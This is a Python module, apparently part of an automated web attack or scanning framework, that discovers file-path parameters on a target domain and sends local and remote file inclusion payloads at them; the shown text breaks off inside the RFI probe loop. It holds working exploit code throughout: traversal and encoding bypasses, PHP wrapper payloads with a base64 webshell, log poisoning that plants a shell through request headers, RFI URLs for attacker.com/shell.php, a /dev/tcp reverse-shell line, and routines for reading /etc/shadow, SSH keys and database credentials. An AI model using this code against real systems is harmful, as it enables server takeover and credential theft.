# core/lfi_rfi.py
from __future__ import annotations

import base64
import logging
import os
import re
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum, auto
from typing import Any, Callable, Dict, List, Optional, Set, Tuple
from urllib.parse import quote, urlencode, urljoin, urlparse, urlunparse, parse_qs, urlencode as _ue

import requests
from requests import Response
from requests.exceptions import RequestException

logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────────────────────
# Enums
# ─────────────────────────────────────────────────────────────────────────────

class LfiVariant(Enum):
    # Classic path traversal
    TRAVERSAL_RELATIVE      = "traversal_relative_dotdot"
    TRAVERSAL_ABSOLUTE      = "traversal_absolute_path"
    TRAVERSAL_BACKSLASH     = "traversal_backslash_windows"

    # Encoding bypass
    BYPASS_URL_ENCODE       = "bypass_url_single_encode"
    BYPASS_DOUBLE_ENCODE    = "bypass_double_url_encode"
    BYPASS_UTF8_OVERLONG    = "bypass_utf8_overlong"
    BYPASS_NULL_BYTE        = "bypass_null_byte_truncation"
    BYPASS_PATH_NORMALISE   = "bypass_path_normalisation_tricks"
    BYPASS_SEMICOLON        = "bypass_semicolon_separator"
    BYPASS_UNC              = "bypass_unc_path_windows"

    # PHP stream wrappers
    WRAPPER_PHP_FILTER_B64  = "php_filter_base64_encode"
    WRAPPER_PHP_FILTER_ROT13= "php_filter_rot13"
    WRAPPER_PHP_FILTER_CHAIN= "php_filter_chain_rce"
    WRAPPER_PHP_INPUT       = "php_input_wrapper_rce"
    WRAPPER_PHP_DATA        = "php_data_wrapper_rce"
    WRAPPER_PHP_EXPECT      = "php_expect_wrapper_rce"
    WRAPPER_ZIP             = "zip_phar_wrapper"
    WRAPPER_PHAR            = "phar_wrapper_unserialise"

    # Log poisoning
    LOG_POISON_UA           = "log_poison_user_agent"
    LOG_POISON_REFER        = "log_poison_referer"
    LOG_POISON_PROC_ENVIRON = "log_poison_proc_environ"
    LOG_POISON_SESSION      = "log_poison_session_file"

    # RFI
    RFI_HTTP                = "rfi_http"
    RFI_DATA_URI            = "rfi_data_uri"
    RFI_SMB                 = "rfi_smb_unc"


class FindingSeverity(Enum):
    CRITICAL = 10
    HIGH     = 7
    MEDIUM   = 5
    LOW      = 3
    INFO     = 1


class FindingStatus(Enum):
    CONFIRMED  = auto()
    LIKELY     = auto()
    POSSIBLE   = auto()
    NOT_VULN   = auto()


# ─────────────────────────────────────────────────────────────────────────────
# Data structures
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class LfiTarget:
    """A URL + parameter name that accepts file path input."""
    url:         str
    param:       str                    # query param or path segment name
    method:      str                    # GET | POST
    param_type:  str                    # url_param | path_param | form_field
    baseline:    Optional[str] = None   # baseline response body
    source:      str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url":        self.url,
            "param":      self.param,
            "method":     self.method,
            "param_type": self.param_type,
            "source":     self.source,
        }


@dataclass
class LfiFinding:
    finding_id:   str
    variant:      LfiVariant
    severity:     FindingSeverity
    status:       FindingStatus
    target_url:   str
    param:        str
    payload:      str
    evidence:     Dict[str, Any]
    file_read:    Optional[str]         # truncated content if confirmed
    attack_steps: List[str]
    notes:        str
    timestamp:    datetime = field(default_factory=datetime.now)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "finding_id":   self.finding_id,
            "variant":      self.variant.value,
            "severity":     self.severity.name,
            "status":       self.status.name,
            "target_url":   self.target_url,
            "param":        self.param,
            "payload":      self.payload[:500],
            "evidence":     self.evidence,
            "file_read":    self.file_read,
            "attack_steps": self.attack_steps,
            "notes":        self.notes,
            "timestamp":    self.timestamp.isoformat(),
        }


@dataclass
class LfiResult:
    run_id:            str
    domain:            str
    targets_tested:    int
    findings:          List[Dict[str, Any]]
    files_read:        List[str]
    rce_via_wrapper:   bool
    score:             float
    risk_level:        str
    techniques_tested: List[str]
    recommendations:   List[str]
    started_at:        datetime
    finished_at:       datetime

    def to_dict(self) -> Dict[str, Any]:
        return {
            "run_id":            self.run_id,
            "domain":            self.domain,
            "targets_tested":    self.targets_tested,
            "findings":          self.findings,
            "files_read":        self.files_read,
            "rce_via_wrapper":   self.rce_via_wrapper,
            "score":             round(self.score, 2),
            "risk_level":        self.risk_level,
            "techniques_tested": self.techniques_tested,
            "recommendations":   self.recommendations,
            "started_at":        self.started_at.isoformat(),
            "finished_at":       self.finished_at.isoformat(),
            "duration_s":        round(
                (self.finished_at - self.started_at).total_seconds(), 3
            ),
        }


# ─────────────────────────────────────────────────────────────────────────────
# HTTP pool
# ─────────────────────────────────────────────────────────────────────────────

class _HttpPool:
    _UA_DEFAULT = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    )

    def __init__(self, timeout: float = 9.0, delay: float = 0.3,
                 verify_tls: bool = False):
        self._timeout = timeout
        self._delay   = delay
        self._verify  = verify_tls
        self._local   = threading.local()
        self._last    = threading.local()

    def _sess(self) -> requests.Session:
        if not hasattr(self._local, "s"):
            s = requests.Session()
            s.headers["User-Agent"] = self._UA_DEFAULT
            s.verify = self._verify
            s.max_redirects = 3
            self._local.s = s
        return self._local.s

    def _throttle(self) -> None:
        last = getattr(self._last, "ts", 0.0)
        gap  = time.time() - last
        if gap < self._delay:
            time.sleep(self._delay - gap)
        self._last.ts = time.time()

    def get(
        self,
        url:     str,
        params:  Optional[Dict[str, str]] = None,
        headers: Optional[Dict[str, str]] = None,
    ) -> Optional[Response]:
        self._throttle()
        try:
            return self._sess().get(
                url, params=params, headers=headers or {},
                timeout=self._timeout, allow_redirects=True,
            )
        except RequestException as e:
            logger.debug("GET %s: %s", url, e)
            return None

    def get_raw_url(self, url: str, headers: Optional[Dict[str, str]] = None,
                    ua: Optional[str] = None) -> Optional[Response]:
        """GET with full URL already containing payload — no encoding."""
        self._throttle()
        try:
            hdrs = dict(headers or {})
            if ua:
                hdrs["User-Agent"] = ua
            return self._sess().get(
                url, headers=hdrs, timeout=self._timeout,
                allow_redirects=True,
            )
        except RequestException as e:
            logger.debug("GET_RAW %s: %s", url, e)
            return None

    def post(
        self,
        url:     str,
        data:    Optional[Dict[str, str]] = None,
        headers: Optional[Dict[str, str]] = None,
    ) -> Optional[Response]:
        self._throttle()
        try:
            return self._sess().post(
                url, data=data or {}, headers=headers or {},
                timeout=self._timeout, allow_redirects=True,
            )
        except RequestException as e:
            logger.debug("POST %s: %s", url, e)
            return None

    def reset(self) -> None:
        if hasattr(self._local, "s"):
            self._local.s.close()
            del self._local.s


# ─────────────────────────────────────────────────────────────────────────────
# Target discoverer — builds LfiTarget list from scan_results
# ─────────────────────────────────────────────────────────────────────────────

class _TargetDiscoverer:
    """
    Reads scan_results without network calls.
    Sources:
      1. payload_analysis.injection_points (url_param, path_param, form_fields)
      2. osint_correlation.exposed_paths — Wayback / URLScan URLs with params
      3. email_enumeration login pages (file= param common in legacy PHP)
      4. tech_detection base URLs — append common LFI-prone param names
    """

    # Parameters that historically accept file path input
    _FILE_PARAMS: List[str] = [
        "file", "page", "include", "path", "template", "view", "doc",
        "document", "folder", "root", "pg", "style", "pdf", "layout",
        "action", "conf", "content", "data", "filename", "filepath",
        "load", "mod", "module", "name", "news", "open", "read",
        "redirect", "ref", "section", "show", "site", "source", "src",
        "type", "url", "cat", "category", "dir", "download", "fetch",
        "get", "goto", "id", "img", "item", "lang", "language",
        "link", "location", "menu", "nav", "p", "pag", "param",
        "php_path", "prefix", "require", "req", "resource", "route",
        "sub", "suffix", "target", "text", "theme", "topic", "uri",
    ]

    def discover(
        self,
        domain:       str,
        scan_results: Dict[str, Any],
    ) -> List[LfiTarget]:
        targets: List[LfiTarget] = []
        seen:    Set[Tuple[str, str]] = set()

        def add(t: LfiTarget) -> None:
            key = (t.url, t.param)
            if key not in seen:
                seen.add(key)
                targets.append(t)

        # 1. payload_analysis injection_points
        pa = scan_results.get("payload_analysis", {})
        for ip in pa.get("injection_points", []):
            pt     = ip.get("param_type", "")
            url    = ip.get("url", "")
            method = ip.get("method", "GET").upper()
            if not url:
                continue

            if pt in ("url_param", "path_param"):
                # Extract existing params or use each file param
                parsed = urlparse(url)
                qs     = parse_qs(parsed.query)
                if qs:
                    for pname in qs:
                        add(LfiTarget(url=url, param=pname, method=method,
                                      param_type=pt, source="payload_analysis"))
                else:
                    for pname in self._FILE_PARAMS[:12]:
                        add(LfiTarget(url=url, param=pname, method=method,
                                      param_type=pt, source="payload_analysis"))

            elif pt == "form_fields":
                for pname in self._FILE_PARAMS[:8]:
                    add(LfiTarget(url=url, param=pname, method="POST",
                                  param_type="form_field",
                                  source="payload_analysis"))

        # 2. exposed_paths from OSINT
        osint = scan_results.get("osint_correlation", {})
        for path_entry in osint.get("exposed_paths", [])[:30]:
            url = path_entry.get("url") or path_entry.get("path", "")
            if not url:
                continue
            if not url.startswith("http"):
                url = f"https://{domain}{url}"
            parsed = urlparse(url)
            qs     = parse_qs(parsed.query)
            for pname, vals in qs.items():
                if any(hint in pname.lower() for hint in self._FILE_PARAMS):
                    add(LfiTarget(url=url, param=pname, method="GET",
                                  param_type="url_param",
                                  source="osint_exposed_path"))

        # 3. tech_detection base URLs + file param guesses
        base_seen: Set[str] = set()
        for url in scan_results.get("tech_detection", {}):
            parsed = urlparse(url)
            base   = f"{parsed.scheme}://{parsed.netloc}"
            if base not in base_seen:
                base_seen.add(base)
                for pname in self._FILE_PARAMS[:10]:
                    add(LfiTarget(
                        url        = f"{base}/index.php",
                        param      = pname,
                        method     = "GET",
                        param_type = "url_param",
                        source     = "tech_detection_guess",
                    ))

        # 4. subdomains — probe each active one
        for sub in scan_results.get("subdomains", []):
            if not (sub.get("http_status") or sub.get("https_status")):
                continue
            scheme = "https" if sub.get("https_status") else "http"
            base   = f"{scheme}://{sub['subdomain']}"
            for pname in ["file", "page", "include", "path", "template"][:5]:
                add(LfiTarget(
                    url=f"{base}/index.php", param=pname,
                    method="GET", param_type="url_param",
                    source="subdomain_guess",
                ))

        return targets


# ─────────────────────────────────────────────────────────────────────────────
# Payload factory — generates every LFI/RFI variant
# ─────────────────────────────────────────────────────────────────────────────

class _PayloadFactory:
    """
    Generates payloads for each LfiVariant.
    rfi_host: attacker-controlled host for RFI payloads.
    is_php: whether the target is PHP (enables wrapper payloads).
    is_windows: whether the target is likely Windows IIS.
    """

    # Files tried for each OS
    _LINUX_FILES: List[Tuple[str, str]] = [
        ("/etc/passwd",                    "root:.*?:/bin/(bash|sh)"),
        ("/etc/shadow",                    r"root:\$[0-9a-z]\$"),
        ("/etc/hostname",                  r"^[a-z0-9_-]+\s*$"),
        ("/etc/hosts",                     r"127\.0\.0\.1\s+localhost"),
        ("/proc/self/environ",             r"PATH=|HOME=|USER="),
        ("/proc/self/cmdline",             r"\x00"),
        ("/var/log/apache2/access.log",    r'GET / HTTP|"GET'),
        ("/var/log/apache2/error.log",     r'\[error\]|\[warn\]'),
        ("/var/log/nginx/access.log",      r'GET / HTTP|"GET'),
        ("/var/log/nginx/error.log",       r'\[error\]|connect\(\)'),
        ("/var/log/auth.log",              r"sshd|sudo|PAM"),
        ("/root/.ssh/id_rsa",              r"-----BEGIN .{1,20}PRIVATE KEY-----"),
        ("/home/www-data/.ssh/id_rsa",     r"-----BEGIN .{1,20}PRIVATE KEY-----"),
        ("/var/www/html/wp-config.php",    r"DB_PASSWORD|DB_HOST"),
        ("/var/www/html/config.php",       r"db_pass|database|password"),
        ("/etc/mysql/my.cnf",              r"\[mysqld\]|datadir"),
        ("/etc/php/*/php.ini",             r"extension_dir|disable_functions"),
        ("/usr/local/etc/php/php.ini",     r"extension_dir|disable_functions"),
        ("/etc/nginx/nginx.conf",          r"worker_processes|http \{"),
        ("/etc/apache2/apache2.conf",      r"ServerRoot|Include"),
        ("/proc/version",                  r"Linux version"),
        ("/proc/self/status",              r"Name:|Pid:"),
    ]

    _WINDOWS_FILES: List[Tuple[str, str]] = [
        ("C:/Windows/win.ini",             r"\[extensions\]|MAPI"),
        ("C:/Windows/system32/drivers/etc/hosts", r"127\.0\.0\.1"),
        ("C:/inetpub/wwwroot/web.config",  r"<configuration>|connectionString"),
        ("C:/Windows/system32/inetsrv/config/applicationHost.config",
                                           r"<system.applicationHost>"),
        ("C:/xampp/htdocs/config.php",     r"db_pass|password"),
        ("C:/Users/Administrator/.ssh/id_rsa", r"-----BEGIN .{1,20}PRIVATE KEY-----"),
        ("C:/boot.ini",                    r"\[boot loader\]"),
    ]

    # Traversal prefix depths (number of ../ hops)
    _DEPTHS: List[int] = [2, 3, 4, 5, 6, 7, 8, 10]

    # PHP filter chain template for read bypass (ROT13 + base64)
    _FILTER_B64   = "php://filter/convert.base64-encode/resource={path}"
    _FILTER_ROT13 = "php://filter/read=string.rot13/resource={path}"
    _FILTER_CHAIN = (
        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode"
        "|convert.iconv.UTF8.UTF7|convert.base64-decode/resource={path}"
    )

    # PHP filter chain RCE (Synacktiv technique — chains iconv filters to build
    # arbitrary string without writing a file)
    _FILTER_CHAIN_RCE_STUB = (
        "php://filter/"
        "convert.iconv.UTF8.CSISO2022KR|"
        "convert.base64-encode|"
        "convert.iconv.UTF8.UTF7|"
        "convert.iconv.CP869.UTF-32|"
        "convert.iconv.MACUK.UCS4|"
        "convert.base64-decode|"
        "convert.base64-encode|"
        "convert.iconv.UTF8.UTF7|"
        "convert.base64-decode"
        "/resource=/etc/passwd"
    )

    def __init__(
        self,
        rfi_host:    str  = "attacker.com",
        is_php:      bool = True,
        is_windows:  bool = False,
    ):
        self._rfi_host  = rfi_host
        self._is_php    = is_php
        self._is_win    = is_windows

    # ── traversal payloads ────────────────────────────────────────────────────

    def traversal_payloads(
        self,
        filepath: str,
    ) -> List[Tuple[LfiVariant, str, str]]:
        """Returns list of (variant, payload, description)."""
        out: List[Tuple[LfiVariant, str, str]] = []

        for depth in self._DEPTHS:
            prefix = "../" * depth

            # 1. Plain relative
            out.append((
                LfiVariant.TRAVERSAL_RELATIVE,
                f"{prefix}{filepath.lstrip('/')}",
                f"plain ../ x{depth}",
            ))

            # 2. Absolute path
            out.append((
                LfiVariant.TRAVERSAL_ABSOLUTE,
                filepath,
                "absolute path",
            ))

            # 3. URL-encoded slash
            enc = quote(filepath, safe="")
            out.append((
                LfiVariant.BYPASS_URL_ENCODE,
                f"{prefix.replace('/', '%2F')}{enc}",
                "url-encoded slashes",
            ))

            # 4. Double URL-encoded
            out.append((
                LfiVariant.BYPASS_DOUBLE_ENCODE,
                f"{'..%252F' * depth}{quote(filepath.lstrip('/'), safe='')}",
                "double url-encoded",
            ))

            # 5. UTF-8 overlong encoding for /  (0xC0 0xAF)
            overlong_slash = "%c0%af"
            out.append((
                LfiVariant.BYPASS_UTF8_OVERLONG,
                f"{'..%c0%af' * depth}{filepath.lstrip('/').replace('/', overlong_slash)}",
                "utf-8 overlong 0xc0af slash",
            ))

            # 6. Null byte (PHP < 5.3.4)
            out.append((
                LfiVariant.BYPASS_NULL_BYTE,
                f"{prefix}{filepath.lstrip('/')}%00",
                "null byte truncation",
            ))
            out.append((
                LfiVariant.BYPASS_NULL_BYTE,
                f"{prefix}{filepath.lstrip('/')}%00.jpg",
                "null byte + .jpg suffix",
            ))

            # 7. ....// — avoids simple ../ strip
            out.append((
                LfiVariant.BYPASS_PATH_NORMALISE,
                f"{'..../' * depth}/{filepath.lstrip('/')}",
                "....// strip bypass",
            ))

            # 8. ..;/ — servlet/JSP path normalisation bypass
            out.append((
                LfiVariant.BYPASS_SEMICOLON,
                f"{'..;/' * depth}{filepath.lstrip('/')}",
                "..;/ java/servlet bypass",
            ))

            # 9. Windows backslash
            if self._is_win:
                win_path = filepath.replace("/", "\\")
                out.append((
                    LfiVariant.TRAVERSAL_BACKSLASH,
                    f"{'..\\\\' * depth}{win_path.lstrip('\\')}",
                    "backslash windows",
                ))
                out.append((
                    LfiVariant.BYPASS_UNC,
                    f"\\\\127.0.0.1\\c$\\Windows\\win.ini",
                    "UNC path",
                ))

        return out

    # ── PHP wrappers ──────────────────────────────────────────────────────────

    def php_wrapper_payloads(self) -> List[Tuple[LfiVariant, str, str]]:
        if not self._is_php:
            return []
        out: List[Tuple[LfiVariant, str, str]] = []

        for path, _ in self._LINUX_FILES[:6]:
            out.append((
                LfiVariant.WRAPPER_PHP_FILTER_B64,
                self._FILTER_B64.format(path=path),
                f"php filter b64 → {path}",
            ))
            out.append((
                LfiVariant.WRAPPER_PHP_FILTER_ROT13,
                self._FILTER_ROT13.format(path=path),
                f"php filter rot13 → {path}",
            ))
            out.append((
                LfiVariant.WRAPPER_PHP_FILTER_CHAIN,
                self._FILTER_CHAIN.format(path=path),
                f"php filter chain → {path}",
            ))

        # filter chain RCE stub (no file write needed)
        out.append((
            LfiVariant.WRAPPER_PHP_FILTER_CHAIN,
            self._FILTER_CHAIN_RCE_STUB,
            "php filter chain RCE stub (Synacktiv technique)",
        ))

        # php://input  (needs POST body with PHP code)
        out.append((
            LfiVariant.WRAPPER_PHP_INPUT,
            "php://input",
            "php://input POST body exec",
        ))

        # data:// URI
        b64_shell = base64.b64encode(b"<?php system($_GET['c']);?>").decode()
        out.append((
            LfiVariant.WRAPPER_PHP_DATA,
            f"data://text/plain;base64,{b64_shell}",
            "data:// wrapper webshell",
        ))

        # expect://
        out.append((
            LfiVariant.WRAPPER_PHP_EXPECT,
            "expect://id",
            "expect:// RCE via id command",
        ))

        # zip://
        out.append((
            LfiVariant.WRAPPER_ZIP,
            "zip:///var/www/html/uploads/shell.zip%23shell.php",
            "zip:// wrapper (requires zip upload)",
        ))

        # phar://
        out.append((
            LfiVariant.WRAPPER_PHAR,
            "phar:///var/www/html/uploads/shell.phar/exploit.php",
            "phar:// unserialise gadget",
        ))

        return out

    # ── log poisoning ─────────────────────────────────────────────────────────

    def log_poison_targets(
        self,
    ) -> List[Tuple[LfiVariant, str, str, Optional[str], Optional[str]]]:
        """
        Returns (variant, log_path, description, inject_header_name, inject_value)
        inject_header_name=None means no header needed (proc-based).
        """
        shell = "<?php system($_GET['c']); ?>"
        return [
            (
                LfiVariant.LOG_POISON_UA,
                "/var/log/apache2/access.log",
                "poison apache access.log via User-Agent",
                "User-Agent", shell,
            ),
            (
                LfiVariant.LOG_POISON_UA,
                "/var/log/nginx/access.log",
                "poison nginx access.log via User-Agent",
                "User-Agent", shell,
            ),
            (
                LfiVariant.LOG_POISON_REFER,
                "/var/log/apache2/access.log",
                "poison apache access.log via Referer",
                "Referer", shell,
            ),
            (
                LfiVariant.LOG_POISON_REFER,
                "/var/log/nginx/error.log",
                "poison nginx error.log via Referer",
                "Referer", shell,
            ),
            (
                LfiVariant.LOG_POISON_PROC_ENVIRON,
                "/proc/self/environ",
                "poison /proc/self/environ via HTTP_USER_AGENT",
                "User-Agent", shell,
            ),
            (
                LfiVariant.LOG_POISON_SESSION,
                "/var/lib/php/sessions/sess_artex_probe",
                "poison PHP session file",
                None, None,
            ),
        ]

    # ── RFI payloads ──────────────────────────────────────────────────────────

    def rfi_payloads(self) -> List[Tuple[LfiVariant, str, str]]:
        b64_shell = base64.b64encode(b"<?php system($_GET['c']); ?>").decode()
        return [
            (
                LfiVariant.RFI_HTTP,
                f"http://{self._rfi_host}/shell.php",
                "RFI via http://",
            ),
            (
                LfiVariant.RFI_HTTP,
                f"http://{self._rfi_host}/shell.php%00",
                "RFI http + null byte truncation",
            ),
            (
                LfiVariant.RFI_HTTP,
                f"http://{self._rfi_host}/shell.php?",
                "RFI http + trailing ? to strip extension",
            ),
            (
                LfiVariant.RFI_DATA_URI,
                f"data://text/plain;base64,{b64_shell}",
                "RFI via data:// URI",
            ),
            (
                LfiVariant.RFI_SMB,
                f"\\\\{self._rfi_host}\\share\\shell.php",
                "RFI via SMB UNC (Windows IIS)",
            ),
        ]


# ─────────────────────────────────────────────────────────────────────────────
# Response analyser — decides if response proves LFI
# ─────────────────────────────────────────────────────────────────────────────

class _ResponseAnalyser:
    """
    Four detection layers:
    1. File content fingerprints (compiled regex per target file)
    2. PHP wrapper decoded output (base64 decode check)
    3. Shell execution output (id, uid=, etc.)
    4. Error-based path leakage (failed include path in error message)
    """

    _FILE_SIGS: Dict[str, re.Pattern] = {
        "/etc/passwd":        re.compile(r"root:.*?:/bin/(bash|sh)", re.S),
        "/etc/shadow":        re.compile(r"root:\$[0-9a-z$A-Z.]+:", re.S),
        "/etc/hostname":      re.compile(r"^[a-zA-Z0-9_-]{2,64}\s*$", re.M),
        "/etc/hosts":         re.compile(r"127\.0\.0\.1\s+localhost", re.S),
        "/proc/self/environ": re.compile(r"PATH=|HOME=|HOSTNAME="),
        "/proc/self/cmdline": re.compile(r"php|apache|nginx", re.I),
        "access.log":         re.compile(r'"(GET|POST) /'),
        "error.log":          re.compile(r"\[error\]|\[crit\]", re.I),
        "win.ini":            re.compile(r"\[extensions\]", re.I),
        "web.config":         re.compile(r"<configuration>", re.I),
        "wp-config.php":      re.compile(r"DB_PASSWORD|DB_HOST", re.I),
        "id_rsa":             re.compile(r"-----BEGIN .{1,20}PRIVATE KEY-----"),
        "php.ini":            re.compile(r"extension_dir|disable_functions", re.I),
        "my.cnf":             re.compile(r"\[mysqld\]|datadir", re.I),
    }

    _GENERIC_FILE_SIG = re.compile(
        r"root:x:0:0|/bin/bash|/bin/sh|"             # passwd
        r"\[extensions\]|for 16-bit|MAPI=|"           # win.ini
        r"-----BEGIN .{1,20}PRIVATE KEY-----|"         # private key
        r"DB_PASSWORD|DB_HOST|DB_NAME|"               # wp-config
        r"worker_processes|server_name|"              # nginx.conf
        r"<configuration>|<connectionStrings|"        # web.config
        r"\[mysqld\]|datadir|innodb_buffer|"          # my.cnf
        r"extension_dir|disable_functions|"           # php.ini
        r"SSH-2\.0-|Protocol 2",                      # ssh
        re.S | re.I,
    )

    _SHELL_OUTPUT_SIG = re.compile(
        r"uid=\d+\(\w+\)\s+gid=\d+|"                 # id output
        r"total \d+\ndrwx|"                           # ls output
        r"Linux [\w\-\.]+ \d+\.\d+|"                 # uname -a
        r"Microsoft Windows \[Version",               # Windows ver
        re.S | re.I,
    )

    _ERROR_SIG = re.compile(
        r"(?:failed to open stream|"
        r"No such file or directory|"
        r"include\(.*?\): failed|"
        r"require\(.*?\): failed|"
        r"Warning: include.*?\(.*?\)|"
        r"Warning: require.*?\(.*?\)|"
        r"open_basedir restriction in effect|"
        r"file_get_contents\(.*?\): failed|"
        r"fopen\(.*?\): failed|"
        r"cannot open|"
        r"FileNotFoundError|"
        r"java\.io\.FileNotFoundException)",
        re.I,
    )

    _WRAPPER_B64_SIG = re.compile(r'^[A-Za-z0-9+/\s]{40,}={0,2}$', re.M)

    def analyse(
        self,
        resp:         Response,
        payload:      str,
        filepath:     str,
        baseline_len: Optional[int],
    ) -> Tuple[bool, bool, bool, bool, Dict[str, Any]]:
        """
        Returns (is_lfi, is_wrapper_read, is_rce, is_error_leak, evidence)
        """
        body    = resp.text or ""
        evidence: Dict[str, Any] = {
            "status_code": resp.status_code,
            "body_len":    len(body),
        }

        # 1. file content match
        for key, pat in self._FILE_SIGS.items():
            if key in filepath or key in payload:
                m = pat.search(body)
                if m:
                    evidence["match"]   = m.group(0)[:300]
                    evidence["pattern"] = key
                    return True, False, False, False, evidence

        m = self._GENERIC_FILE_SIG.search(body)
        if m:
            evidence["generic_match"] = m.group(0)[:200]
            return True, False, False, False, evidence

        # 2. PHP wrapper base64 output
        if "php://filter" in payload or "WRAPPER_PHP_FILTER" in payload:
            m = self._WRAPPER_B64_SIG.search(body)
            if m:
                raw = m.group(0).replace("\n", "").replace("\r", "").strip()
                try:
                    decoded = base64.b64decode(raw + "==").decode("utf-8", errors="replace")
                    if any(sig in decoded for sig in ("<?php", "root:", "<html", "[mysqld]")):
                        evidence["decoded_preview"] = decoded[:300]
                        evidence["b64_raw_len"]     = len(raw)
                        return False, True, False, False, evidence
                except Exception:
                    pass

        # 3. Shell execution output (expect/data/input wrappers)
        m = self._SHELL_OUTPUT_SIG.search(body)
        if m:
            evidence["shell_output"] = m.group(0)[:200]
            return False, False, True, False, evidence

        # 4. Error-based path disclosure
        m = self._ERROR_SIG.search(body)
        if m:
            evidence["error_match"] = m.group(0)[:200]
            return False, False, False, True, evidence

        # 5. Anomalous length vs baseline
        if baseline_len is not None:
            delta = len(body) - baseline_len
            if delta > 300:
                evidence["length_delta"] = delta
                evidence["note"] = "Significantly larger than baseline — possible file content"

        return False, False, False, False, evidence


# ─────────────────────────────────────────────────────────────────────────────
# Probe executor
# ─────────────────────────────────────────────────────────────────────────────

class _ProbeExecutor:

    def __init__(
        self,
        http:      _HttpPool,
        factory:   _PayloadFactory,
        analyser:  _ResponseAnalyser,
        is_php:    bool,
        is_win:    bool,
    ):
        self._http     = http
        self._factory  = factory
        self._analyser = analyser
        self._is_php   = is_php
        self._is_win   = is_win

    def probe(self, target: LfiTarget) -> List[LfiFinding]:
        findings: List[LfiFinding] = []

        # Establish baseline
        baseline_len = self._baseline(target)

        # ── traversal probes (Linux + Windows files) ──────────────────────────
        file_list = (
            self._factory._LINUX_FILES[:12] +
            (self._factory._WINDOWS_FILES[:5] if self._is_win else [])
        )

        confirmed_traversal = False
        for filepath, sig_pattern in file_list:
            if confirmed_traversal:
                break
            for variant, payload, desc in self._factory.traversal_payloads(filepath):
                resp = self._inject(target, payload)
                if not resp:
                    continue
                is_lfi, is_wrap, is_rce, is_err, ev = self._analyser.analyse(
                    resp, payload, filepath, baseline_len
                )
                if is_lfi:
                    findings.append(self._make(
                        variant   = variant,
                        severity  = FindingSeverity.CRITICAL,
                        status    = FindingStatus.CONFIRMED,
                        target    = target,
                        payload   = payload,
                        evidence  = {**ev, "file": filepath, "depth_desc": desc},
                        file_read = ev.get("match", ev.get("generic_match", ""))[:300],
                        steps=[
                            f"Inject payload: {target.param}={payload[:60]}...",
                            f"Response contains file contents of {filepath}",
                            "Escalate: read /etc/shadow, wp-config.php, SSH keys",
                            "Chain with log poison or PHP filter for RCE",
                        ],
                        notes=f"LFI confirmed via {desc} — file {filepath!r} read",
                    ))
                    confirmed_traversal = True
                    break

                if is_err:
                    findings.append(self._make(
                        variant   = LfiVariant.TRAVERSAL_RELATIVE,
                        severity  = FindingSeverity.MEDIUM,
                        status    = FindingStatus.LIKELY,
                        target    = target,
                        payload   = payload,
                        evidence  = {**ev, "file": filepath},
                        file_read = None,
                        steps=[
                            "Error message reveals server-side include() path",
                            "Adjust traversal depth to reach root",
                        ],
                        notes=f"Error-based path disclosure — include() error in response",
                    ))
                    break

        # ── PHP wrapper probes ─────────────────────────────────────────────────
        if self._is_php:
            rce_via_wrapper = False
            for variant, payload, desc in self._factory.php_wrapper_payloads():
                resp = None
                # php://input requires POST with PHP code body
                if payload == "php://input":
                    resp = self._http.post(
                        self._build_url(target, payload),
                        data={"": ""},
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                    )
                    # Also try raw POST body
                    if not resp:
                        try:
                            resp = requests.post(
                                self._build_url(target, payload),
                                data=b"<?php system('id'); ?>",
                                headers={"Content-Type": "application/octet-stream"},
                                timeout=9, verify=False,
                            )
                        except RequestException:
                            pass
                else:
                    resp = self._inject(target, payload)

                if not resp:
                    continue

                is_lfi, is_wrap, is_rce, _, ev = self._analyser.analyse(
                    resp, payload, payload, baseline_len
                )

                if is_wrap:
                    # Decode the base64 to show what file was read
                    decoded = ev.get("decoded_preview", "")
                    findings.append(self._make(
                        variant   = variant,
                        severity  = FindingSeverity.CRITICAL,
                        status    = FindingStatus.CONFIRMED,
                        target    = target,
                        payload   = payload,
                        evidence  = ev,
                        file_read = decoded[:300],
                        steps=[
                            f"PHP filter wrapper {payload[:60]}... bypasses include restrictions",
                            "Response is base64-encoded file content",
                            f"Decoded preview: {decoded[:80]}...",
                            "Enumerate all source files for credentials and secrets",
                        ],
                        notes=f"PHP filter wrapper LFI confirmed — {desc}",
                    ))
                    break

                if is_rce and not rce_via_wrapper:
                    rce_via_wrapper = True
                    findings.append(self._make(
                        variant   = variant,
                        severity  = FindingSeverity.CRITICAL,
                        status    = FindingStatus.CONFIRMED,
                        target    = target,
                        payload   = payload,
                        evidence  = ev,
                        file_read = ev.get("shell_output", "")[:200],
                        steps=[
                            f"PHP wrapper {variant.value} executed OS command",
                            "Shell output in response — full RCE",
                            "Drop reverse shell: ?c=bash+-i+>&+/dev/tcp/attacker/4444+0>&1",
                        ],
                        notes=f"RCE via PHP wrapper {desc}",
                    ))

        # ── log poisoning (2-stage) ────────────────────────────────────────────
        for (variant, log_path, desc,
             inject_hdr, inject_val) in self._factory.log_poison_targets():

            if inject_hdr and inject_val:
                # Stage 1: poison the log
                poison_resp = self._http.get_raw_url(
                    target.url,
                    headers={inject_hdr: inject_val},
                )
                if not poison_resp:
                    continue
                time.sleep(0.3)

            # Stage 2: include the log
            for _, traversal_payload, _ in self._factory.traversal_payloads(log_path)[:6]:
                resp = self._inject(target, traversal_payload)
                if not resp:
                    continue
                _, _, is_rce, _, ev = self._analyser.analyse(
                    resp, traversal_payload, log_path, baseline_len
                )
                if is_rce:
                    findings.append(self._make(
                        variant   = variant,
                        severity  = FindingSeverity.CRITICAL,
                        status    = FindingStatus.CONFIRMED,
                        target    = target,
                        payload   = traversal_payload,
                        evidence  = {**ev, "log_path": log_path, "poisoned_header": inject_hdr},
                        file_read = ev.get("shell_output", "")[:200],
                        steps=[
                            f"Stage 1: inject PHP shell into {inject_hdr} header",
                            f"Stage 2: LFI includes {log_path} — shell executes",
                            "Full RCE — upgrade to reverse shell",
                        ],
                        notes=f"Log poisoning RCE via {desc}",
                    ))
                    break

        # ── RFI probes ────────────────────────────────────────────────────────
        for variant, payload, desc in self._factory.rfi_payloads():
            resp = self._inject(target, payload)
